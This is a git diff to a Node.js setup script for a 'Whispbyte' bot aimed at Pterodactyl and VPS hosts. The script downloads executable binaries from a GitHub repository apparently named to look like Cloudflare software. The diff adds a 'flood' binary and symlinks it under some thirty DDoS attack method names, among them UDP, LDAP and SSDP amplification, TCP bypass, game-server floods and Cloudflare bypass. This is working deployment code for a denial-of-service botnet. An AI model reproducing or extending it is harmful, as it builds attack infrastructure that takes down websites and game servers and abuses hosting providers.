@@ -1,8 +1,8 @@
 /**
  * Bot Setup Script for Whispbyte / Pterodactyl / VPS
- * Downloads statically compiled bot binaries and agent.txt
+ * Downloads statically compiled bot binaries, flood binary, and agent.txt
  * Supports HTTP/HTTPS download with automatic wget/curl fallback
- * Keeps process attached to container lifecycle
+ * Sets up all method symlinks and keeps process attached to container lifecycle
  */
 
 const https = require('https');
@@ -15,9 +15,18 @@ const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main
 
 const FILES_TO_DOWNLOAD = [
     { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
+    { url: `${REPO_BASE}/bots/flood`, filename: 'flood', executable: true },
     { url: `${REPO_BASE}/bots/http`, filename: 'http', executable: true },
     { url: `${REPO_BASE}/bots/https`, filename: 'https', executable: true },
     { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
+];
+
+const METHODS = [
+    'dns', 'udp', 'ldap', 'ssdp', 'home', 'udpbypass',
+    'tcp', 'socket', 'ovh', 'tcpmix', 'tcpbypass', 'ack',
+    'game', 'rainbow', 'rocket', 'roblox', 'fivem', 'pubg', 'fortnite', 'warthunder', 'counter', 'samp',
+    'subnet', 'icmp',
+    'httpx', 'rapidflood', 'tls', 'tlsx', 'bypass', 'browser', 'cache', 'cloudflare'
 ];
 
 function downloadHttp(url, destPath) {
@@ -77,6 +86,28 @@ async function downloadFile(url, destPath) {
     }
 }
 
+function createMethodLinks(targetDir) {
+    const floodPath = path.join(targetDir, 'flood');
+    if (!fs.existsSync(floodPath)) return;
+
+    console.log('[*] Setting up method symlinks...');
+    for (const m of METHODS) {
+        const linkPath = path.join(targetDir, m);
+        try {
+            if (fs.existsSync(linkPath)) fs.unlinkSync(linkPath);
+            fs.symlinkSync('flood', linkPath);
+        } catch (_) {
+            try {
+                fs.copyFileSync(floodPath, linkPath);
+                fs.chmodSync(linkPath, 0o755);
+            } catch (err) {
+                console.error(`[!] Failed to link method ${m}: ${err.message}`);
+            }
+        }
+    }
+    console.log('[+] All method links ready.');
+}
+
 async function setup() {
     const targetDir = process.cwd();
     console.log(`[+] Setting up Whispbyte Bot in: ${targetDir}`);
@@ -98,6 +129,8 @@ async function setup() {
             console.error(`[!] Error downloading ${item.filename}: ${err.message}`);
         }
     }
+
+    createMethodLinks(targetDir);
 
     const botBinPath = path.join(targetDir, 'bot');
     if (fs.existsSync(botBinPath)) {
